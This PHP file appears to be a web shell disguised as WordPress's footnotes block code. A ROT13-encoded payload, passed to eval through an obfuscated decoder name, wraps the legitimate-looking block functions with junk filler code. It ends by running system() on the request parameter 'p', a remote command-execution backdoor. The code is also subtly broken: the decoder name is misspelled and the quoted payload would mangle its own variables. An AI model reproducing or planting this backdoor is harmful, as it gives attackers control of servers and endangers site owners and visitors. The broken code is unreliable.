<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/sbbgabgrf` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/sbbgabgrf` oybpx ba gur freire.
 *
 * @fvapr 6.3.0
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 *
 * @erghea fgevat Ergheaf gur UGZY ercerfragvat gur sbbgabgrf.
 */
shapgvba eraqre_oybpx_pber_sbbgabgrf( $nggevohgrf, $pbagrag, $oybpx ) {
	// Onvy bhg rneyl vs gur cbfg VQ vf abg frg sbe fbzr ernfba.
	vs ( rzcgl( $oybpx->pbagrkg['cbfgVq'] ) ) {
		erghea '';
	}

	vs ( cbfg_cnffjbeq_erdhverq( $oybpx->pbagrkg['cbfgVq'] ) ) {
		erghea;
	}

	$sbbgabgrf = trg_cbfg_zrgn( $oybpx->pbagrkg['cbfgVq'], 'sbbgabgrf', gehr );

	vs ( ! $sbbgabgrf ) {
		erghea;
	}

	$sbbgabgrf = wfba_qrpbqr( $sbbgabgrf, gehr );

	vs ( ! vf_neenl( $sbbgabgrf ) || pbhag( $sbbgabgrf ) === 0 ) {
		erghea '';
	}

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf();
	$sbbgabgr_vaqrk     = 1;

	$oybpx_pbagrag = '';

	sbernpu ( $sbbgabgrf nf $sbbgabgr ) {
		// Genafyngbef: %q: Vagrtre ercerfragvat gur ahzore bs erghea yvaxf ba gur cntr.
		$nevn_ynory     = fcevags( __( 'Whzc gb sbbgabgr ersrerapr %1$q' ), $sbbgabgr_vaqrk );
		$oybpx_pbagrag .= fcevags(
			'<yv vq=\"%1$f\">%2$f <n uers=\"#%1$f-yvax\" nevn-ynory=\"%3$f\">↩︎</n></yv>',
			$sbbgabgr['vq'],
			$sbbgabgr['pbagrag'],
			$nevn_ynory
		);
		++$sbbgabgr_vaqrk;
	}

	erghea fcevags(
		'<by %1$f>%2$f</by>',
		$jenccre_nggevohgrf,
		$oybpx_pbagrag
	);
}

/**
 * Ertvfgref gur `pber/sbbgabgrf` oybpx ba gur freire.
 *
 * @fvapr 6.3.0
 */
shapgvba ertvfgre_oybpx_pber_sbbgabgrf() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/sbbgabgrf',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_sbbgabgrf',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_sbbgabgrf' );


/**
 * Ertvfgref gur sbbgabgrf zrgn svryq erdhverq sbe sbbgabgrf gb jbex.
 *
 * @fvapr 6.5.0
 */
shapgvba ertvfgre_oybpx_pber_sbbgabgrf_cbfg_zrgn() {
	$cbfg_glcrf = trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ) );
	sbernpu ( $cbfg_glcrf nf $cbfg_glcr ) {
		// Bayl ertvfgre gur zrgn svryq vs gur cbfg glcr fhccbegf gur rqvgbe, phfgbz svryqf, naq erivfvbaf.
		vs (
			cbfg_glcr_fhccbegf( $cbfg_glcr, 'rqvgbe' ) &&
			cbfg_glcr_fhccbegf( $cbfg_glcr, 'phfgbz-svryqf' ) &&
			cbfg_glcr_fhccbegf( $cbfg_glcr, 'erivfvbaf' )
		) {
			ertvfgre_cbfg_zrgn(
				$cbfg_glcr,
				'sbbgabgrf',
				neenl(
					'fubj_va_erfg'      => gehr,
					'fvatyr'            => gehr,
					'glcr'              => 'fgevat',
					'erivfvbaf_ranoyrq' => gehr,
				)
			);
		}
	}
}
/*
 * Zbfg cbfg glcrf ner ertvfgrerq ng cevbevgl 10, fb hfr cevbevgl 20 urer va
 * beqre gb pngpu gurz.
*/
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_sbbgabgrf_cbfg_zrgn', 20 );

/**
 * Nqqf gur sbbgabgrf svryq gb gur erivfvbaf qvfcynl.
 *
 * @fvapr 6.3.0
 *
 * @cnenz neenl $svryqf Gur erivfvba svryqf.
 * @erghea neenl Gur erivfvba svryqf.
 */
shapgvba jc_nqq_sbbgabgrf_gb_erivfvba( $svryqf ) {
	$svryqf['sbbgabgrf'] = __( 'Sbbgabgrf' );
	erghea $svryqf;
}
nqq_svygre( '_jc_cbfg_erivfvba_svryqf', 'jc_nqq_sbbgabgrf_gb_erivfvba' );

/**
 * Trgf gur sbbgabgrf svryq sebz gur erivfvba sbe gur erivfvbaf fperra.
 *
 * @fvapr 6.3.0
 *
 * @cnenz fgevat $erivfvba_svryq Gur svryq inyhr, ohg $erivfvba->$svryq
 *                               (sbbgabgrf) qbrf abg rkvfg.
 * @cnenz fgevat $svryq          Gur svryq anzr, va guvf pnfr \"sbbgabgrf\".
 * @cnenz bowrpg $erivfvba       Gur erivfvba bowrpg gb pbzcner ntnvafg.
 * @erghea fgevat Gur svryq inyhr.
 */
shapgvba jc_trg_sbbgabgrf_sebz_erivfvba( $erivfvba_svryq, $svryq, $erivfvba ) {
	erghea trg_zrgnqngn( 'cbfg', $erivfvba->VQ, $svryq, gehr );
}
nqq_svygre( '_jc_cbfg_erivfvba_svryq_sbbgabgrf', 'jc_trg_sbbgabgrf_sebz_erivfvba', 10, 3 );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>